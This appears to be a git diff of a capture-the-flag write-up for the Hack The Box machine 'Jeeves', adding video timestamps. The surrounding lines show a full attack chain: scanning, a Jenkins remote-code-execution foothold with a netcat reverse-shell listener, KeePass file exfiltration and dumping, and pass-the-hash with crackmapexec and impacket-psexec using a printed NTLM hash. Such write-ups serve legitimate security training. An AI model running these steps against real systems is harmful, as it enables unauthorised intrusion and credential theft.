@@ -22,7 +22,8 @@ image = "jeeves-icon.png"
 
 ## Finding the vulnerability
 
-`nmap` shows open ports 80, 135,445, and 50000 .
+`nmap` shows open ports 80, 135,445, and 50000. <br>
+[Video timestamp 0:10](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=10s)
 
 ```python
 nmap -Pn -p- --min-rate=1000 -T4 10.10.10.63 -vv -oN ports
@@ -54,7 +55,8 @@ nmap -p$ports 10.10.10.63 -sCV -oN version-basescripts
 
 ---
 
-We try to login to SMB, but it requires a password.
+We try to login to SMB, but it requires a password. <br>
+[Video timestamp 0:15](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=15s)
 
 ```shell
 smbclient -N -L \\\\10.10.10.63\\
@@ -62,11 +64,17 @@ smbclient -N -L \\\\10.10.10.63\\
 
 ![](9.png)
 
-Port 50000 gives the 404 Not Found error listed with nmap.
+---
+
+Port 50000 gives the 404 Not Found error listed with nmap. <br>
+[Video timestamp 0:25](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=25s)
 
 ![](4.png)
 
-Port 80 also gives an error, this time as an image.
+---
+
+Port 80 also gives an error, this time as an image. <br>
+[Video timestamp 0:32](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=32s)
 
 ![](5.png)
 
@@ -76,10 +84,13 @@ Port 80 also gives an error, this time as an image.
 
 ![](8.png)
 
-We run `ffuf` and find a `/askjeeves` directory on port 50000 that's running Jenkins.
+---
+
+We run `ffuf` and find a `/askjeeves` directory on port 50000 that's running Jenkins. <br>
+[Video timestamp 1:40](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=100s)
 
 ```python
-ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.63:50000/FUZZ -recursion -recursion-depth 1
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.63:50000/FUZZ -recursion -recursion-depth 1 -o ffuf
 ```
 
 ![](10.png)
@@ -88,7 +99,8 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:F
 
 ## Foothold
 
-We find a RCE exploit for Jenkins at [Jenkinds RCE Creating Modifying Project](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-project)
+We find a RCE exploit for Jenkins at [Jenkins RCE Creating Modifying Project](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-project) <br>
+[Video timestamp 2:19](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=139s)
 
 1. Create a `New Item`
 
@@ -121,7 +133,8 @@ rlwrap -cAr nc -lvnp <your chosen port>
 
 ![](18.png)
 
-We get the user flag on `c:\users\kohsuke\desktop`.
+We get the user flag on `c:\users\kohsuke\desktop`. <br>
+[Video timestamp 4:19](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=259s)
 
 ```cmd
 dir c:\users\
@@ -139,9 +152,12 @@ dir
 
 ![](20.png)
 
+---
+
 ## Privilege Escalation
 
-We look around and find a `KeePass`file in the `c:\users\kohsuke\documents`directory.
+We look around and find a `KeePass`file in the `c:\users\kohsuke\documents`directory. <br>
+[Video timestamp 4:28](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=268s)
 
 ```cmd
 cd ..\Documents
@@ -153,7 +169,10 @@ dir
 
 ![](21.png)
 
-We move the file over to our attack box with base64 in powershell.
+---
+
+We move the file over to our attack box with base64 in powershell. <br>
+[Video timestamp 4:40](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=280s)
 
 **On Windows:**
 
@@ -181,7 +200,10 @@ ls
 
 ![](25.png)
 
-We use `kpcli` to get the passwords.
+---
+
+We use `kpcli` to get the passwords. <br>
+[Video timestamp 5:37](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=337s)
 
 ```python
 sudo apt update && sudo apt install kpcli
@@ -247,7 +269,10 @@ echo "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00" > hashe
 
 ![](30.png)
 
-We use `crackmapexec` to test the hash on the smb server. We find out the hash works on administrator.
+---
+
+We use `crackmapexec` to test the hash on the smb server. We find out the hash works on administrator. <br>
+[Video timestamp 7:17](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=437s)
 
 ```python
 crackmapexec smb 10.10.10.63 --local-auth -u Administrator -H hashes
@@ -255,7 +280,10 @@ crackmapexec smb 10.10.10.63 --local-auth -u Administrator -H hashes
 
 ![](31.png)
 
-We use `impacket-psexec` to get on the server as Administrator.
+---
+
+We use `impacket-psexec` to get on the server as Administrator. <br>
+[Video timestamp 7:32](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=452s)
 
 ```python
 impacket-psexec Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
@@ -263,7 +291,10 @@ impacket-psexec Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404
 
 ![](32.png)
 
-Instead of a root flag, we find `hm.txt` .
+---
+
+Instead of a root flag, we find `hm.txt`. <br>
+[Video timestamp 7:51](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=471s)
 
 ```cmd
 cd c:\users\administrator\desktop
@@ -291,7 +322,10 @@ dir /r
 
 ![](35.png)
 
-We read the `root.txt`stream with `CMD` or `PowerShell`.
+---
+
+We read the `root.txt`stream with `CMD` or `PowerShell`. <br>
+[Video timestamp 8:21](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=487s)
 
 **CMD:**
 
